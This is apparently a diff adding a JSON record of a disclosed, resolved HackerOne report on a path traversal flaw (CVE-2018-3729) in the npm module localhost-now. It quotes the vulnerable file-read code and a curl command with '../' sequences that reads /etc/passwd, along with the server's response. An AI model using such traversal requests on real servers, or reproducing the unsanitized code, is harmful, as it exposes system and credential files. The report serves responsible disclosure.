@@ -1,0 +1,136 @@
+{
+  "id": 312889,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTI4ODk=",
+  "url": "https://hackerone.com/reports/312889",
+  "title": "[localhost-now] Path Traversal allows to read content of arbitrary file",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-06T14:08:47.103Z",
+  "submitted_at": "2018-02-06T14:08:47.103Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3729"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-02-26T21:22:37.083Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-26T21:22:25.338Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal in localhost-now module.\nIt allows to read content of arbitrary files on the remote server.\n\n## Module\n\n**localhost-now**\n\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\n\nhttps://www.npmjs.com/package/localhost-now\n\nversion: 1.0.1\n\nStats\n0 downloads in the last day\n24 downloads in the last week\n89 downloads in the last month\n\n~1100 estimated downloads per year\n\n\n## Description\n\nLack of file path sanitization causes that any file on the server might be read by malicious user:\n\n```javascript\n// node_modules/localhost-now/lib/app.js, line 10:\n    var url = req.url;\n\n    if (url.indexOf('?') != -1) {\n        url = url.split('?')[0];\n    }\n\n    var file = url === \"/\" ? \"/index.html\" : url;\n\n    fs.readFile(path.normalize(process.cwd()) + file, function(err, data) {\n\n```\nPath is read directly from request and used to read content of file without checking against Path Traversal attempt.\n\n## Steps To Reproduce:\n\n\n- install ```localhost-now```:\n\n```\n$ npm install localhost-now\n```\n\n- run ```localhost-now``` in direcotry of your choice:\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/localhost-now/bin/localhost \nWeb Server started on localhost:1337\n```\n\n- execute following ```curl``` command (adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n```\n\n- see result:\n\n```\n*   Trying ::1...\n* Connected to localhost (::1) port 1337 (#0)\n> GET /../../../../../etc/passwd HTTP/1.1\n> Host: localhost:1337\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< content-type: text/\n< Date: Tue, 06 Feb 2018 14:06:55 GMT\n< Connection: keep-alive\n< Content-Length: 2615\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n(...)\n```\n\n## Supporting Material/References:\n\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability might be used to read content of any file on the server where module is run",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-03-28T21:22:25.470Z",
+  "allow_singular_disclosure_after": -256068145.15462264,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "apapedulimu",
+    "ysx",
+    "dudez",
+    "eveeez",
+    "13ern",
+    "khalooda0x",
+    "charansatharu",
+    "tkye",
+    "madhuri_jan02"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5908,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "localhost-now",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
